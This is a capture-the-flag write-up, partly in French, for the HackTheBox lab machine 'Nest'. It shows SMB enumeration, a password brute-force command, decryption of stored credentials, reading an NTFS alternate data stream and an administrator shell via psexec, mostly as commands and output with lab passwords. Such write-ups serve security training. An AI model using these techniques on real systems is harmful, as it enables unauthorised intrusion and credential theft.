\chapter{Nest}
\begin{itemize}
    \item {\bf technics}: binary, NTFS Alternate streams
    \item {\bf Components}:  smb
    \item {\bf tools}: telnel, mono, detect-it-easy, dnSpy, mono
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}

\begin{verbatim}
$ sudo nmap -sV -sC 10.10.10.178
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 04:43 CEST
Nmap scan report for 10.10.10.178
Host is up (0.029s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
|_clock-skew: -1s
| smb2-time:
|   date: 2022-09-25T02:43:48
|_  start_date: 2022-09-25T02:41:05
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required

$ sudo nmap -sV -sC -p- 10.10.10.178
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-25 04:48 CEST
Nmap scan report for 10.10.10.178
Host is up (0.037s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     Reporting Service V1.2
|     Unrecognised command
|   Help:
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
$ enum4linux-ng -A 10.10.10.178 -u anonymous -p test

OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '7601'

Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Data
[+] Mapping: OK, Listing: OK
[*] Testing share IPC$
[-] Could not check share: STATUS_INVALID_PARAMETER
[*] Testing share Secure$
[+] Mapping: OK, Listing: DENIED
[*] Testing share Users
[+] Mapping: OK, Listing: OK
\end{verbatim}

\begin{verbatim}
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location:
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
\end{verbatim}


\begin{verbatim}
$ psexec.py TempUser:welcome2019@10.10.10.178
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.178.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Data' is not writable.
[-] share 'Secure$' is not writable.
[-] share 'Users' is not writable.
\end{verbatim}


\begin{verbatim}
$ enum4linux-ng -A -u TempUser -p welcome2019 10.10.10.178

'1002':
  username: TempUser
  name: TempUser
  acb: '0x00000210'
  description: Temp User Account
'1004':
  username: C.Smith
  name: Carl Smith
  acb: '0x00000210'
  description: Flag User
'1005':
  username: Service_HQK
  name: HQK Service Account
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000010'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000214'
  description: Built-in account for guest access to the computer/domain



 =========================================
|    Policies via RPC for 10.10.10.178    |
 =========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: None
  Minimum password length: None
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set
\end{verbatim}

\begin{verbatim}
$ crackmapexec  smb 10.10.10.178 -u C.Smith -p /usr/share/wordlists/passwords/rockyou.txt
\end{verbatim}

\verb+RU_config.xml+:
\begin{verbatim}
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">

  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
\end{verbatim}


\verb+NotePadPlusPlus/config.xml+:
\begin{verbatim}
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
\end{verbatim}

on ne peut pas lire le repertoire \verb+Secure$/IT+ mais on peut le traverser:
\begin{verbatim}
smbmap.py -H 10.10.10.178 -u TempUser -p welcome2019  -R Secure$/IT/Carl
\end{verbatim}

\subsubsection{RUScanner}

globalement il lit le fichier de config et donc on a les fonctions utils qui
decryptent le mdp donc on modifie le main
\begin{verbatim}
Module Module1

    Sub Main()

        Dim pt = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")
        Console.WriteLine("Plaintext: " + pt)
        'Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        'Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}



    End Sub

End Module
\end{verbatim}


\begin{verbatim}
\VB Projects\WIP\RU\RUScanner\bin\Debug>DbPof.exe
Plaintext: xRxRxPANCAK3SxRxRx
\end{verbatim}

\subsubsection{smb}
\begin{verbatim}
$ psexec.py C.Smith:xRxRxPANCAK3SxRxRx@10.10.10.178
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.178.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'Data' is not writable.
[-] share 'Secure$' is not writable.
[-] share 'Users' is not writable.
\end{verbatim}

\begin{verbatim}
$ sudo mount -t cifs -o ro,username=C.Smith,password=xRxRxPANCAK3SxRxRx '//10.10.10.178/Users' tmp
\end{verbatim}


\subsection{Privesc}

\subsubsection{HQK}

\begin{verbatim}
$ telnet 10.10.10.178 4386

>HELP LIST


LIST
Lists the available queries in the current directory, along with an ID number
for each query. This number can be used with the RUNQUERY or SHOWQUERY
commands.

To change the current directory use the SETDIR command

>SHOW QUERY 1

Unrecognised command
>QHOWQUERY 1

Unrecognised command
>showquery 1

Debug mode must be enabled to run this command

>help debug


DEBUG <Password>
Enables debug mode, which allows the use of additional commands to use for
troubleshooting network and configuration issues. Requires a password which
will be set by your system administrator when the service was installed

Examples:
DEBUG MyPassw0rd     Attempts to enable debug mode by using the
                     password "MyPassw0rd"
\end{verbatim}

\begin{verbatim}
$ ./smbmap.py -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx  -R 'Users'

 fr--r--r--                0 Wed Jul 21 20:47:12 2021    Debug Mode Password.txt

cks of size 4096. 1835598 blocks available
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Fri Aug  9 01:06:12 AM 2019 CEST
access_time:    Fri Aug  9 01:06:12 AM 2019 CEST
write_time:     Fri Aug  9 01:08:17 AM 2019 CEST
change_time:    Wed Jul 21 08:47:12 PM 2021 CEST
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes

smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password:$DATA"


$ cat Debug\ Mode\ Password.txt\:Password\:\$DATA
WBQ201953D8w
\end{verbatim}

\begin{verbatim}
$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available

>session

--- Session Information ---

Session ID: eb2b0260-e338-40a4-b953-d6de3064885c
Debug: True
Started At: 9/26/2022 11:58:19 AM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.16.3:46490
Current Query Directory: C:\Program Files\HQK\ALL QUERIES

>setdir C:\Program Files\HQK\

Current directory set to HQK
>runquery 1

Invalid database configuration found. Please contact your system administrator
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  ALL QUERIES
[DIR]  LDAP
[DIR]  Logs
[1]   HqkSvc.exe
[2]   HqkSvc.InstallState
[3]   HQK_Config.xml

Current Directory: HQK

>setdir C:\Program Files\HQK\LDAP

Current directory set to LDAP
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

>setdir C:\Program Files\HQK\logs

Current directory set to logs
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   Log.txt

Current Directory: logs
>showquery 1

File over size limit. Are you sure this is a HQK query file?
\end{verbatim}

retour au pogramme pour dechiffrer le mdp mais ca ne va pas

on decompile le programme \verb+HqkLdap.exe+ et on trouve la même fonction mais
avec des valeurs différentes.

on obtient le mdp \verb+XtH4nkS4Pl4y1nGX+
\begin{verbatim}
$ psexec.py administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.178.....
[*] Found writable share ADMIN$
[*] Uploading file CYsnBgaR.exe
[*] Opening SVCManager on 10.10.10.178.....
[*] Creating service tQpB on 10.10.10.178.....
[*] Starting service tQpB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
\end{verbatim}


\section{Theorie}


